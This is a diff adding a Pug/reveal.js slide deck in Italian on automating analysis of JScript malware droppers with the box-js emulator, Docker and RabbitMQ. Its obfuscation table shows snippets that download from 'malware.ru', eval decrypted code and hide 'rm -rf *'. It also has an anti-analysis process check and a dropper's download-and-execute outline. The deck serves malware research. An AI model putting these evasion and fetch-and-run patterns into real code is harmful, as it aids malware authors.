@@ -1,0 +1,337 @@
+- const title = "Automatizzare la malware analysis con Node.js, Docker e RabbitMQ"
+
+doctype html
+html
+	head
+		meta(charset="utf-8")
+		meta(name="author" content="CapacitorSet")
+		meta(name="apple-mobile-web-app-capable" content="yes")
+		meta(name="apple-mobile-web-app-status-bar-style" content="black-translucent")
+		meta(name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no")
+
+		link(rel="stylesheet" href="../common/css/reveal.css")
+		link#theme(rel="stylesheet" href="../common/css/theme/white.css")
+
+		link(rel="stylesheet" href="../common/lib/css/monokai-sublime.css")
+
+		style.
+			tt {
+				font-family: monospace !important;
+			}
+			.pro {
+				color: #43a047; // Material green 600
+			}
+			.contro {
+				color: #e53935; // Material red 600
+			}
+
+		title=title
+	body
+		.reveal
+			.slides
+				section
+					section#title
+						h3=title
+						hr
+						p @CapacitorSet
+
+				section
+					p Queste slide sono state presentate a #[a(href="http://endsummercamp.org/") ESC17], e illustrano il funzionamento di box-js a grandi linee.
+
+					p Attenzione: molte slide si sviluppano verso il basso, non verso destra.
+
+					p Alcune slide sono corredate di "speaker notes" (appunti personali non visibili al pubblico), che compariranno in un riquadro grigio.
+
+					aside.notes Speaker notes here
+
+				section
+					aside.notes Scenario tipico: social engineering. L'infezione è divisa in più stadi. La si può prevenire in diversi modi: a noi interessa il dropper.
+					div(style="display: flex;")
+						div(style="flex: 0 0 70%;")
+							img(src="../common/img/thunderbird.png")
+						div(style="flex: 1;")
+							ul
+								li.fragment 1° stadio: #[tt fattura UPS.js]
+								li.fragment Utente apre il file, che scarica...
+								li.fragment 2° stadio: #[tt locky.exe]
+				section
+					section
+						ol
+							li: strong Reverse engineering manuale
+							li Analisi in VM
+							li Emulazione
+						aside.notes Ci sono diversi approcci. [Scorrere verso il basso]
+
+					section
+						aside.notes Diversivo contro le euristiche degli antivirus, e contro l'analisi manuale
+						p Codice originale: presente, ma illeggibile
+						img(src="../common/img/ugly.png")
+					section
+						p Codice formattato
+						img(src="../common/img/beautify.png")
+					section
+						h3 Offuscamento
+						p Codice equivalente, ma meno leggibile
+						style.
+							.striped td {
+								border: 1px black solid !important;
+							}
+							.striped tr {
+								background-color: #eee;
+							}
+							.striped tr:nth-child(even) {
+								background-color: #ccc;
+							}
+						table(style="font-size: 26px; border: 2px black solid").striped
+							tr
+								td: tt download("http://malware.ru/")
+								td: tt download(base64decode("..."))
+								td Uso di codifiche
+							tr
+								td: tt beEvil();
+								td: tt code = decrypt("..."); eval(code)
+								td Uso di crittografia (XOR)
+							tr
+								td: tt shell.Execute("rm -rf *");
+								td: tt things = ["rm&nbsp;-rf&nbsp;*",&nbsp;"Execute"]; shell[things[1]](things[0]);
+								td Costanti &rarr; variabili in array
+							//tr
+								td: tt if (HTTPstatus == 200) success();
+								td: tt HTTPstatus == 0xC8 && success();
+								td Trasformazione dei costrutti
+						aside.notes Le due versioni sono #[u funzionalmente equivalenti], ma una è meno leggibile
+					section
+						h3 Risultato finale
+						img(src="../common/img/clean.png")
+					section
+						strong Algoritmo
+						br
+						ol
+							li #[tt listaUrl = [20 URL...]]
+							li Per ogni elemento di #[tt listaUrl]:
+							ol
+								li Fai una richiesta GET
+								li Se la risposta non è ok (404 not found, irraggiungibile, etc.) passa al prossimo
+								li Se la risposta non è un eseguibile, passa al prossimo
+								li Salva la risposta su #[tt %TEMP%/nomerandom.exe]
+								li Esegui il file
+					section
+						ul
+							.pro
+								li Comprensione accurata
+							.contro
+								li Da 15 minuti a 1 ora
+								li Richiede una conoscenza approfondita di JScript
+				section
+					section
+						ol
+							li Reverse engineering manuale
+							li: strong Analisi in VM
+							li Emulazione
+					section
+						img(src="diagrams/VM_stack.svg")
+						br
+						i Virtualizziamo Windows
+					section
+						h3 Monitoraggio
+						ul
+							aside.notes API Windows: con l'intercettazione "rilevo tutte le interazioni"
+							li
+								| Intercettare le chiamate all'API Windows
+								ul
+									li lettura registro di sistema
+									li crea nuovo processo
+									li ...
+							li Monitoraggio della memoria
+							li Monitoraggio del disco
+							li Monitoraggio del traffico di rete (DNS, download, etc)
+					section
+						h3 Problemi
+						p I malware adottano misure contro l'analisi automatica:
+						ul
+							li Controllano di non essere in una VM
+							li Controllano la presenza di processi di monitoraggio
+						pre: code.js.
+							processi = GetObject("WinMgmts:").InstancesOf("Win32_Process")
+							isVM = false;
+							for (i = 0; i < processi.length; i++) {
+								if (processi[i] == "Wireshark.exe") isVM = true;
+								if (processi[i] == "OllyDbg.exe") isVM = true;
+								if (processi[i] == "...") isVM = true;
+							}
+							if (!isVM) {
+								// ...
+							}
+					section
+						h3 Risultati
+						ol
+							li Connesso a sito1.com... timeout.
+							li
+								| Connesso a sito2.it... collegato.
+								small.contro Contro: non tutti gli URL vengono scoperti!
+							li Scaricato http://sito2.it/locky.exe
+							li Salvato C:\TEMP\locky.exe
+							li Eseguito C:\TEMP\locky.exe
+								small.pro Pro: analizziamo anche il virus vero e proprio
+							li locky.exe ha criptato il file Desktop\foto.jpg
+							li ...
+					section
+						div(style="text-align: left;")
+							ul
+								.pro
+									li #[i Veloce]: 2-3 minuti, 100% automatico
+									li Analizza sia il dropper, sia il virus
+								.contro
+									li 1-2 GB RAM, >50 GB HDD
+									li Procedimento opaco, difficile da debuggare
+						aside.notes Opaco perché non posso modificare facilmente il funzionamento dell'interprete
+				section
+					section
+						ol
+							li Reverse engineering manuale
+							li Analisi in VM
+							li: strong Emulazione
+					section
+						table
+							tr
+								td: img(src="diagrams/VM_stack.svg" style="opacity: 0.5;")
+								td: img(src="diagrams/Box_stack.svg")
+							tr
+								td(style="text-align: center;"): del Virtualizziamo Windows
+								td(style="text-align: center;") #[em Emuliamo] l'ambiente Javascript
+
+						div(style="display: flex;")
+							div(style="flex: 0 0 40%;")
+								br
+							div(style="flex: 0 0 60%;")
+					section
+						p Microsoft JScript è un #[u dialetto] di JavaScript
+						p Un qualsiasi motore JavaScript può eseguire JScript, con delle modifiche
+						.fragment
+							p Quale motore? #[strong Node.js] (V8). Sviluppato da Google, funziona da riga di comando, stesso motore di Chrome
+					section
+						h4 Librerie ActiveX
+						img(src="diagrams/ActiveX.svg" style="border: 0")
+						p Vogliamo creare librerie "finte", che emulano quelle reali e catturano informazioni
+						aside.notes = #[u far credere] al sample di funzionare correttamente
+					style.
+						.rootCall {
+							color: #e53935;
+						}
+						.rewriteCall {
+							color: #ffb300;
+						}
+						.argument {
+							color: #7cb342;
+						}
+					section
+						h3 Stubs
+						p Sono versioni fittizie (#[i stub]) dei componenti ActiveX che ci interessano
+						p Sembrano funzionare correttamente, ma "registrano" le interazioni:
+						pre: code.js(style="width: 900px").
+							class XMLHTTP {
+								download(url) {
+									headers["User-Agent"] = "Internet Explorer 6.0";
+									print(`Nuova richiesta a ${url}`);
+									output = request("GET", url);
+									print(`Ho scaricato ${output.length} byte.`);
+									print("Tipo di file: " + identify(output));
+									return output;
+								}
+							}
+					section
+						h3 AST rewriting
+						p Dissezioniamo il codice e aggiungiamo dei pezzi
+						div(style="display: flex;")
+							div(style="flex: 0 0 50%;")
+								img(src="diagrams/vanilla_AST.dot.svg")
+								code #[span.rootCall eval](#[span.argument pippo.decrypt() + "unknown code"])
+							div(style="flex: 0 0 20%;").fragment
+								img(src="diagrams/rewritten_AST.dot.svg")
+								code  #[span.rootCall eval](#[span.rewriteCall rewrite](#[span.argument pippo.decrypt() + "unknown code"]))
+						aside.notes È un modo più comodo di manipolare il codice
+					section
+						strong Risultati
+						br
+						ol
+							li #[tt listaUrl = [20 URL...]]
+							li Per ogni elemento di #[tt listaUrl]:
+							ol
+								li
+									| Fai una richiesta GET
+									br
+									small Analisi offline
+								li Se la risposta non è ok (404 not found, irraggiungibile, etc.) passa al prossimo
+								li Se la risposta non è un eseguibile, passa al prossimo
+								li Salva la risposta su #[tt %TEMP%/nomerandom.exe]
+								li Esegui il file
+					section
+						ul
+							.pro
+								li #[i Velocissimo]: da 5 a 90 secondi
+								li Tiny footprint: ~50 MB RAM
+								li Più flessibile &rarr; più potente
+								li Facile da debuggare
+							.contro
+								li Richiede patch/bugfix
+								li Può richiedere l'intervento umano
+						aside.notes Richiede patch perché bisogna riscrivere da zero tutto ActiveX, e questo può comportare degli errori
+				section
+					i demo
+					hr
+					p Nota per il lettore: in questa fase, apro un terminale, do il comando per analizzare un sample, e spiego l'output di box-js. In particolare, provo prima l'analisi offline e poi quella con --download, dove faccio vedere che il secondo stadio viene scaricato correttamente, infine carico il secondo stadio su VirusTotal e verifico che è malevolo.
+				section
+					section
+						p Nella pratica:
+						h2 Malware analysis pipeline
+						//
+							p Automatizzare la malware analysis#[br][con Node.js, Docker e RabbitMQ]
+							br
+						img(src="diagrams/Pipeline.svg" style="border: 0")
+					section
+						p Esigenza: creare un ambiente isolato, e facile da riprodurre
+						p Usiamo i container di #[strong Docker]: isolati dall'host, istanziati con un semplice comando:
+
+						pre: code.bash.
+							docker run CapacitorSet/box-js     \ # Nome immagine
+							    --volume ~/sample.js:/samples/ \ # Cartelle condivise
+							    --env "QUEUE_IP=172.17.0.1"      # Variabili d'ambiente
+					section
+						p Esigenza: gestire una coda di sample da analizzare, con diversi worker
+						p Con #[strong RabbitMQ] creiamo una #[i work queue]
+						img(src="../common/img/queue.gif")
+						p Approccio facilmente scalabile: possiamo aggiungere e togliere worker a piacimento
+					section
+						h3 Applicazioni
+						p Scenario tipico: ricercatore/azienda nel campo della malware analysis
+						p L'utente estrae velocemente i secondi stadi, in forma di URL o di file, e li può analizzare con VirusTotal/Malwr/altre sandbox
+
+						br
+
+						p In sintesi: l'emulazione semplifica e velocizza l'analisi del primo stadio dell'infezione, e produce analisi più accurate
+				section
+					h3(style="text-transform: none;") @CapacitorSet
+					img(style="border: 0;" src="../common/img/github.png")
+					p Il mio progetto di malware analysis:
+					tt: a(href="https://github.com/CapacitorSet/box-js") https://github.com/CapacitorSet/box-js
+
+		script(src="../common/lib/js/head.min.js")
+		script(src="../common/js/reveal.min.js")
+		script.
+			// More info https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+				showNotes: true,
+
+				// More info https://github.com/hakimel/reveal.js#dependencies
+				dependencies: [
+					{ src: '../common/lib/js/classList.min.js', condition: function() { return !document.body.classList; } },
+					{ src: '../common/plugin/notes/notes.js', async: true },
+					{ src: '../common/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+				]
+			});
